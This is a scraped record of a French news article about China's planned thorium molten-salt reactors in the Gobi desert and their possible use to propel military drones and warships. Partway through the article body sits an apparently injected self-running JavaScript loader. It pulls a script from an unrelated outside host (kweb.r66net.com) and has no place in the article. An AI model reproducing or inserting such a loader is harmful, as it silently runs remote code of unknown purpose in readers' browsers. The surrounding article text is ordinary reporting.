{"title": "Drones : la Chine travaille sur une propulsion nucléaire", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "19/12/2017", "content": "Le gouvernement chinois finance un projet de réacteurs nucléaires à sels fondus qui seront installés dans le désert de Gobi. Cette technologie peut, théoriquement, créer plus de chaleur et d'énergie que les réacteurs nucléaires à l'uranium, tout en ne produisant qu'un millième de déchets radioactifs. La Chine va entreprendre la construction de deux réacteurs nucléaires utilisant les sels fondus à la place de l'eau pour leur refroidissement. Sur le papier, cette technologie peut produire près de trois fois plus de  chaleur  que les  réacteurs nucléaires  existants à base d' uranium . Avec un  air  chaud dépassant les 800 °C, les  applications  envisageables sont vastes, que ce soit dans le civil ou le militaire. Ce dernier domaine intéresse particulièrement les autorités chinoises, qui veulent exploiter cette avancée pour propulser des navires de guerre mais aussi des  drones . Selon le site  South China Morning Post , qui s'appuie sur des informations de l'Académie chinoise des sciences, travaillant sur le sujet depuis plusieurs années ( Thorium Molten Salt Reactor : A Safe Way Out for Nuclear Energy ), le gouvernement va investir 3,3 milliards de dollars dans ce projet pour financer notamment la construction de deux réacteurs nucléaires à sels fondus qui seront implantés dans le  désert  de Gobi (province du Gansu) près d'un lac salé.  En 2015, l'Union européenne a lancé le projet Samofar ( Safety Assessment of the Molten Salt Fast Reactor ), qui vise à démontrer les bénéfices des réacteurs à sels fondus. L'initiative est supervisée par l'université de technologie de Delft (Pays-Bas), qui chapeaute plusieurs laboratoires et entreprises, dont le CNRS, l'IRSN, le CEA, AREVA et EDF. Le consortium compte fabriquer un prototype à l'horizon 2020. © Nixki, Fotolia                               Des drones militaires pour la surveillance et les communications Les réacteurs seront enfouis sous  terre  et devraient être opérationnels en 2020. La chaleur qu'ils dégageront pourra produire 12 mégawatts, de quoi faire fonctionner une centrale électrique et plusieurs usines, dont une  usine de dessalement . L'autre avantage du dispositif est qu'il fonctionne non pas à l'uranium mais au  thorium , un  métal  dont la Chine dispose en abondance dans son sol. Faiblement radioactif, le thorium réduit les risques d'accident nucléaire et ne produit qu'un millième des déchets qu'engendre l' uranium .   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La Chine n'est pas le premier pays à explorer cette solution. Dans les années 1950, l'armée de l'air américaine a travaillé sur un projet de réacteur à sels fondus pour propulser des avions. Mais les problèmes d'érosion des matériaux et les difficultés pour réduire le poids et la taille du dispositif ont conduit à un abandon des recherches dans les années 1970. Près de cinquante ans plus tard, la Chine entend réussir là où les États-Unis ont échoué. Les scientifiques auraient mis au point un  alliage  et des revêtements qui résistent à la  corrosion . Par ailleurs, ils seraient en mesure de miniaturiser la technologie au point de pouvoir s'en servir pour propulser des  drones  militaires lors de missions de longue  durée . Il est question d'appareils survolant les océans à haute altitude pour faire office de systèmes de surveillance, de communication voire d'attaque selon les circonstances. L'avantage stratégique serait très important. Mais cette perspective est sans doute encore lointaine, car les deux réacteurs du Gansu doivent avant tout servir à démontrer la faisabilité du concept. À suivre donc... Ce qu'il faut retenir Le réacteur nucléaire à sels fondus est une piste technologique explorée depuis les années 1950 comme une alternative plus sûre et moins dommageable pour l’environnement que l’uranium. La Chine va construire deux réacteurs nucléaires à sels fondus alimentés par du thorium, métal dont le pays dispose en abondance. Les scientifiques chinois disent pouvoir suffisamment miniaturiser la technologie pour pouvoir s’en servir sur des drones militaires. ", "theme": "tech"}